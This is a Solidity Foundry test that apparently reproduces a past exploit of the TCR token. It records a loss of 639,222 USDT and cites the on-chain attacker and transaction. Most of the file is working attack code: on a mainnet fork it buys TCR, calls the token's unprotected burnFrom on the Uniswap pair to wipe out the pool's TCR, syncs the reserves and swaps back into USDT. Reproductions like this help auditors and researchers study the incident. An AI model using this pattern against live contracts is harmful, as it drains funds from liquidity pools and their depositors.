// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

/*
    @KeyInfo
    - Total Lost: 639,222 $USDT
    - Attacker: https://etherscan.io/address/0xb19b7f59c08ea447f82b587c058ecbf5fde9c299
    - Attack Contract: https://etherscan.io/address/0x6653d9bcbc28fc5a2f5fb5650af8f2b2e1695a15
    - Vuln Contract: https://etherscan.io/address/0xe38b72d6595fd3885d1d2f770aa23e94757f91a1
    - Attack Tx: https://phalcon.blocksec.com/explorer/tx/eth/0x81e9918e248d14d78ff7b697355fd9f456c6d7881486ed14fdfb69db16631154
*/
interface IUSDTInterface {
    function approve(address spender, uint value) external;
}

interface ITcrInterface {
    function burnFrom(address from, uint256 amount) external;
    function approve(address spender, uint256 amount) external;
}

interface IUNIswapV2 {
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline) external payable;
    function swapExactTokensForTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
}

interface IPairPoolInterface {
    function sync() external;
}

contract ExploitTest is Test {
    address TCR = 0xE38B72d6595FD3885d1D2F770aa23E94757F91a1;
    address usdt = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address route = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address pool = 0x420725A69E79EEffB000F98Ccd78a52369b6C5d4;
    uint256 constant MAX = type(uint256).max;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("mainnet", 14_139_082 - 1);
        cheats.label(address(usdt), "USDT");
        cheats.label(address(TCR), "TCR");
        cheats.label(address(route), "UniswapRoute");
        cheats.label(address(weth), "WETH");
        cheats.label(address(pool), "PairPool");
        deal(address(this), 0.04 ether);
    }

    function testExploit() external {
        IUSDTInterface(usdt).approve(route, type(uint256).max);
        ITcrInterface(TCR).approve(route, type(uint256).max);
        ITcrInterface(TCR).approve(pool, type(uint256).max);

        emit log_named_decimal_uint(
            "Exploiter USDT balance before attack",
            IERC20(usdt).balanceOf(address(this)),
            IERC20(usdt).decimals()
        );
        uint256 wethAmount = address(this).balance;
        address[] memory path = new address[](3);
        path[0] = weth;
        path[1] = usdt;
        path[2] = TCR;
        uint256 deadline = block.timestamp + 24 hours;

        IUNIswapV2(route).swapExactETHForTokens{value: wethAmount}(1, path, address(this), deadline);
        uint256 poolTCRbalance = IERC20(TCR).balanceOf(pool);
        ITcrInterface(TCR).burnFrom(pool, poolTCRbalance - 100000000);
        uint256 attackerTCRbalance = IERC20(TCR).balanceOf(address(this));
        IPairPoolInterface(pool).sync();
        address[] memory path2 = new address[](2);
        path2[0] = TCR;
        path2[1] = usdt;
        IUNIswapV2(route).swapExactTokensForTokens(attackerTCRbalance, 1, path2, address(this), deadline);


        emit log_named_decimal_uint(
            "Exploiter USDT balance after attack",
            IERC20(usdt).balanceOf(address(this)),
            IERC20(usdt).decimals()
        );
    }
}
